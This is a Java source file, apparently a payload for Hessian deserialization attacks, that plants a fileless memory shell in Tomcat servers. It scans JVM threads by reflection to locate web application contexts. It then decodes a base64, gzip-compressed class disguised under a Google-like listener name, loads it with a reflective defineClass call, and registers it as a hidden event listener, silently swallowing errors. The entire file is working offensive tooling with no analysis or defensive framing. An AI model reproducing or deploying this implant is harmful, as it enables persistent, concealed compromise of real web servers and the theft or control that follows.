package hessian;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.zip.GZIPInputStream;

public class JavaWrapper_mem {
    public String getClassName() {
        return "com.google.gso.ServletRequestXedryiListener";
    }

    public String getBase64String() throws IOException {
        return new String("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");
    }

    public JavaWrapper_mem() {
        try {
            List<Object> contexts = this.getContext();
            Iterator var2 = contexts.iterator();

            while(var2.hasNext()) {
                Object context = var2.next();
                Object listener = this.getListener(context);
                this.addListener(context, listener);
            }
        } catch (Exception var5) {
        }

    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList();
        Thread[] threads = (Thread[])((Thread[])invokeMethod(Thread.class, "getThreads"));
        Object context = null;

        try {
            Thread[] var4 = threads;
            int var5 = threads.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                Thread thread = var4[var6];
                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                    HashMap childrenMap = (HashMap)getFV(getFV(getFV(thread, "target"), "this$0"), "children");
                    Iterator var9 = childrenMap.keySet().iterator();

                    while(var9.hasNext()) {
                        Object key = var9.next();
                        HashMap children = (HashMap)getFV(childrenMap.get(key), "children");
                        Iterator var12 = children.keySet().iterator();

                        while(var12.hasNext()) {
                            Object key1 = var12.next();
                            context = children.get(key1);
                            if (context != null && context.getClass().getName().contains("StandardContext")) {
                                contexts.add(context);
                            }

                            if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                                contexts.add(context);
                            }
                        }
                    }
                } else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                    context = getFV(getFV(thread.getContextClassLoader(), "resources"), "context");
                    if (context != null && context.getClass().getName().contains("StandardContext")) {
                        contexts.add(context);
                    }

                    if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                        contexts.add(context);
                    }
                }
            }

            return contexts;
        } catch (Exception var14) {
            throw new RuntimeException(var14);
        }
    }

    private Object getListener(Object context) {
        Object listener = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }

        try {
            listener = classLoader.loadClass(this.getClassName()).newInstance();
        } catch (Exception var9) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                defineClass.setAccessible(true);
                Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                listener = clazz.newInstance();
            } catch (Throwable var8) {
            }
        }

        return listener;
    }

    public void addListener(Object context, Object listener) throws Exception {
        if (!this.isInjected(context, listener.getClass().getName())) {
            try {
                invokeMethod(context, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{listener});
            } catch (Exception var7) {
                Object[] objects = (Object[])((Object[])invokeMethod(context, "getApplicationEventListeners"));
                List listeners = Arrays.asList(objects);
                ArrayList arrayList = new ArrayList(listeners);
                arrayList.add(listener);
                invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{arrayList.toArray()});
            }

        }
    }

    public boolean isInjected(Object context, String evilClassName) throws Exception {
        Object[] objects = (Object[])((Object[])invokeMethod(context, "getApplicationEventListeners"));
        List listeners = Arrays.asList(objects);
        ArrayList arrayList = new ArrayList(listeners);

        for(int i = 0; i < arrayList.size(); ++i) {
            if (arrayList.get(i).getClass().getName().contains(evilClassName)) {
                return true;
            }
        }

        return false;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[])((byte[])decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str));
        } catch (Exception var4) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke((Object)null);
            return (byte[])((byte[])decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str));
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];

        int n;
        while((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }

        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class clazz = obj.getClass();

        while(clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException var4) {
                clazz = clazz.getSuperclass();
            }
        }

        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(Object obj, String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = obj instanceof Class ? (Class)obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;

        while(method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    Method[] methods = tempClass.getDeclaredMethods();

                    for(int i = 0; i < methods.length; ++i) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException var11) {
                tempClass = tempClass.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            if (obj instanceof Class) {
                try {
                    return method.invoke((Object)null, param);
                } catch (IllegalAccessException var9) {
                    throw new RuntimeException(var9.getMessage());
                }
            } else {
                try {
                    return method.invoke(obj, param);
                } catch (IllegalAccessException var10) {
                    throw new RuntimeException(var10.getMessage());
                }
            }
        }
    }

    public static void _main(String[] argv) throws Exception {
        new JavaWrapper_mem();
    }

}

